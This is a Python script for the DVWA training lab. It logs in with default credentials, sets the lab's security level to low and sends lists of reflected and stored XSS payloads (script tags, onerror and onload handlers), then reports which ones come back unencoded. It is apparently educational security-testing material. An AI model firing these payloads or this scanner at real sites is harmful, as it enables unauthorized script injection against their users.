#!/usr/bin/env python3
"""
XSS Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of XSS vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
import sys
import argparse
from urllib.parse import urljoin

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    # Fallback if colorama is not installed
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = BLUE = ""
    class Style:
        RESET_ALL = BRIGHT = ""
    COLORS_AVAILABLE = False

# Configuration
BASE_URL = "http://localhost"
TARGET_REFLECTED = f"{BASE_URL}/vulnerabilities/xss_r/"
TARGET_STORED = f"{BASE_URL}/vulnerabilities/xss_s/"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"

def print_banner():
    """Display tool banner"""
    banner = f"""
{Fore.CYAN}{'='*70}
    XSS Exploitation Tool - DVWA
    Author: Daniel Oyanogbezina
    Educational Purpose Only - Use Responsibly
{'='*70}{Style.RESET_ALL}
    """
    print(banner)
    
    if not COLORS_AVAILABLE:
        print(f"{Fore.YELLOW}[!] Tip: Install colorama for colored output (pip3 install colorama){Style.RESET_ALL}\n")

def extract_csrf_token(session, url):
    """Extract CSRF token from a page"""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        
        if token_input:
            return token_input.get('value')
        return None
    except Exception as e:
        print(f"{Fore.RED}[!] Error extracting CSRF token: {e}{Style.RESET_ALL}")
        return None

def get_authenticated_session(username='admin', password='password', verbose=False):
    """
    Login to DVWA and set security level to low
    
    Args:
        username: DVWA username (default: admin)
        password: DVWA password (default: password)
        verbose: Enable verbose output
    
    Returns:
        Authenticated session object or None on failure
    """
    print(f"{Fore.YELLOW}[*] Attempting to authenticate to DVWA...{Style.RESET_ALL}")
    session = requests.Session()
    
    try:
        # Get login page and extract CSRF token
        response = session.get(LOGIN_URL, timeout=10)
        
        if response.status_code != 200:
            print(f"{Fore.RED}[!] Failed to reach login page. Status: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Make sure DVWA is running at {BASE_URL}{Style.RESET_ALL}")
            return None
        
        # Extract CSRF token
        user_token = extract_csrf_token(session, LOGIN_URL)
        
        if not user_token:
            print(f"{Fore.RED}[!] Could not find CSRF token on login page{Style.RESET_ALL}")
            return None
        
        if verbose:
            print(f"{Fore.BLUE}[DEBUG] CSRF Token: {user_token[:20]}...{Style.RESET_ALL}")
        
        # Perform login
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }
        
        response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        
        # Check if login was successful
        if 'login.php' in response.url or 'logout' not in response.text.lower():
            print(f"{Fore.RED}[!] Login failed. Check your credentials.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Default credentials are username='admin', password='password'{Style.RESET_ALL}")
            return None
        
        print(f"{Fore.GREEN}[+] Successfully logged in as '{username}'{Style.RESET_ALL}")
        
        # Set security level to low
        print(f"{Fore.YELLOW}[*] Setting security level to 'low'...{Style.RESET_ALL}")
        
        # Get security page to extract token
        security_token = extract_csrf_token(session, SECURITY_URL)
        
        if security_token:
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': security_token
            }
            session.post(SECURITY_URL, data=security_data)
            print(f"{Fore.GREEN}[+] Security level set to 'low'{Style.RESET_ALL}")
        else:
            # Fallback method without token (older DVWA versions)
            session.get(f"{SECURITY_URL}?security=low&seclev_submit=Submit")
            print(f"{Fore.GREEN}[+] Security level configured{Style.RESET_ALL}")
        
        return session
        
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[!] Connection Error: Could not connect to {BASE_URL}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Make sure DVWA is running (check with: curl {BASE_URL}){Style.RESET_ALL}")
        return None
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Timeout: Server took too long to respond{Style.RESET_ALL}")
        return None
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error during authentication: {e}{Style.RESET_ALL}")
        return None

def test_reflected_xss(session, verbose=False):
    """
    Test Reflected XSS vulnerabilities
    
    Args:
        session: Authenticated session object
        verbose: Enable verbose output
    """
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"[*] Testing Reflected XSS (Non-Persistent)")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    # Various XSS payloads to test
    payloads = [
        ("<script>alert('XSS')</script>", "Basic script tag"),
        ("<img src=x onerror=alert('XSS')>", "Image error handler"),
        ("<svg/onload=alert('XSS')>", "SVG onload"),
        ("<body onload=alert('XSS')>", "Body onload"),
        ("<iframe src=javascript:alert('XSS')>", "Iframe javascript"),
        ("<input onfocus=alert('XSS') autofocus>", "Input autofocus"),
        ("<marquee onstart=alert('XSS')>", "Marquee event"),
        ("<details open ontoggle=alert('XSS')>", "Details toggle"),
    ]
    
    successful = 0
    blocked = 0
    
    for payload, description in payloads:
        try:
            params = {'name': payload}
            response = session.get(TARGET_REFLECTED, params=params, timeout=10)
            
            # Check if payload appears unencoded in response
            if payload in response.text:
                print(f"{Fore.GREEN}[+] SUCCESS: {description}{Style.RESET_ALL}")
                print(f"    Payload: {Fore.WHITE}{payload}{Style.RESET_ALL}")
                successful += 1
                if verbose:
                    print(f"    {Fore.BLUE}[DEBUG] Payload found in HTML response{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[-] BLOCKED: {description}{Style.RESET_ALL}")
                print(f"    Payload: {Fore.WHITE}{payload}{Style.RESET_ALL}")
                blocked += 1
                if verbose:
                    # Check if it was encoded
                    if '&lt;' in response.text or '&gt;' in response.text:
                        print(f"    {Fore.BLUE}[DEBUG] Payload was HTML-encoded{Style.RESET_ALL}")
                    else:
                        print(f"    {Fore.BLUE}[DEBUG] Payload was filtered/removed{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error testing payload '{description}': {e}{Style.RESET_ALL}")
            blocked += 1
    
    # Summary
    print(f"\n{Fore.CYAN}Reflected XSS Summary:{Style.RESET_ALL}")
    print(f"  Successful: {Fore.GREEN}{successful}{Style.RESET_ALL}")
    print(f"  Blocked: {Fore.YELLOW}{blocked}{Style.RESET_ALL}")
    print(f"  Total Tested: {successful + blocked}")

def test_stored_xss(session, verbose=False):
    """
    Test Stored XSS vulnerabilities
    
    Args:
        session: Authenticated session object
        verbose: Enable verbose output
    """
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"[*] Testing Stored XSS (Persistent)")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    # Payloads for stored XSS
    test_cases = [
        {
            'name': "<script>alert('Stored XSS')</script>",
            'message': "Testing persistent XSS",
            'description': "Basic script in name field"
        },
        {
            'name': "Test User",
            'message': "<script>alert('Message XSS')</script>",
            'description': "Script in message field"
        },
        {
            'name': "<img src=x onerror=alert('IMG')>",
            'message': "Image payload test",
            'description': "Image error handler in name"
        }
    ]
    
    successful = 0
    blocked = 0
    
    for test in test_cases:
        try:
            print(f"{Fore.YELLOW}[*] Testing: {test['description']}{Style.RESET_ALL}")
            
            # Extract CSRF token from stored XSS page
            user_token = extract_csrf_token(session, TARGET_STORED)
            
            data = {
                'txtName': test['name'],
                'mtxMessage': test['message'],
                'btnSign': 'Sign Guestbook'
            }
            
            # Add CSRF token if available
            if user_token:
                data['user_token'] = user_token
                if verbose:
                    print(f"    {Fore.BLUE}[DEBUG] Using CSRF token{Style.RESET_ALL}")
            
            # Submit the payload
            response = session.post(TARGET_STORED, data=data, timeout=10)
            
            # Check if payload was stored and executed
            response_verify = session.get(TARGET_STORED, timeout=10)
            
            if test['name'] in response_verify.text or test['message'] in response_verify.text:
                print(f"{Fore.GREEN}[+] SUCCESS: Stored XSS payload persisted!{Style.RESET_ALL}")
                print(f"    Name: {Fore.WHITE}{test['name']}{Style.RESET_ALL}")
                print(f"    Message: {Fore.WHITE}{test['message']}{Style.RESET_ALL}")
                successful += 1
            else:
                print(f"{Fore.YELLOW}[-] BLOCKED: Payload was filtered{Style.RESET_ALL}")
                blocked += 1
                
        except Exception as e:
            print(f"{Fore.RED}[!] Error testing stored XSS: {e}{Style.RESET_ALL}")
            blocked += 1
    
    # Summary
    print(f"\n{Fore.CYAN}Stored XSS Summary:{Style.RESET_ALL}")
    print(f"  Successful: {Fore.GREEN}{successful}{Style.RESET_ALL}")
    print(f"  Blocked: {Fore.YELLOW}{blocked}{Style.RESET_ALL}")
    print(f"  Total Tested: {successful + blocked}")

def main():
    """Main execution function"""
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='DVWA XSS Exploitation Training Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-u', '--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('-p', '--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--reflected-only', action='store_true', help='Test only reflected XSS')
    parser.add_argument('--stored-only', action='store_true', help='Test only stored XSS')
    parser.add_argument('--base-url', default='http://localhost', help='Base URL of DVWA')
    
    args = parser.parse_args()
    
    # Update global URLs if custom base URL provided
    global BASE_URL, TARGET_REFLECTED, TARGET_STORED, LOGIN_URL, SECURITY_URL
    if args.base_url != 'http://localhost':
        BASE_URL = args.base_url.rstrip('/')
        TARGET_REFLECTED = f"{BASE_URL}/vulnerabilities/xss_r/"
        TARGET_STORED = f"{BASE_URL}/vulnerabilities/xss_s/"
        LOGIN_URL = f"{BASE_URL}/login.php"
        SECURITY_URL = f"{BASE_URL}/security.php"
    
    # Display banner
    print_banner()
    
    # Authenticate to DVWA
    session = get_authenticated_session(args.username, args.password, args.verbose)
    
    if not session:
        print(f"\n{Fore.RED}[!] Failed to authenticate to DVWA{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Troubleshooting tips:{Style.RESET_ALL}")
        print(f"    1. Ensure DVWA is running: curl {BASE_URL}")
        print(f"    2. Check credentials (default: admin/password)")
        print(f"    3. Verify DVWA database is set up")
        print(f"    4. Check for firewall/network issues")
        sys.exit(1)
    
    # Run XSS tests based on arguments
    try:
        if args.stored_only:
            test_stored_xss(session, args.verbose)
        elif args.reflected_only:
            test_reflected_xss(session, args.verbose)
        else:
            # Run both tests
            test_reflected_xss(session, args.verbose)
            test_stored_xss(session, args.verbose)
        
        # Final summary
        print(f"\n{Fore.MAGENTA}{'='*70}")
        print(f"[!] Testing Complete")
        print(f"[!] Educational purposes only - Use responsibly")
        print(f"[!] Always obtain proper authorization before testing")
        print(f"{'='*70}{Style.RESET_ALL}\n")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Testing interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error during testing: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
